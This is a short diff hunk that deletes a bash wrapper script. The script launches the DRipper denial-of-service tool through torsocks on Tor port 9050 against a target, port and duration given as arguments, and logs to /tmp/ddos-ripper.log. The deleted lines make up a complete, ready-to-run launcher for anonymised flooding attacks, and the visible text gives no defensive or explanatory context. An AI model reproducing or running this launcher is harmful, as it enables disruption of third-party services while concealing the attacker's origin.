@@ -1,7 +1,0 @@
-#!/bin/bash
-target=$1
-port=$2
-time=$3
-
-cd {{ git_dest }}
-torsocks -P 9050 python3 DRipper.py -s $target -p $port -t 135 -q $time > /tmp/ddos-ripper.log 2>&1 &
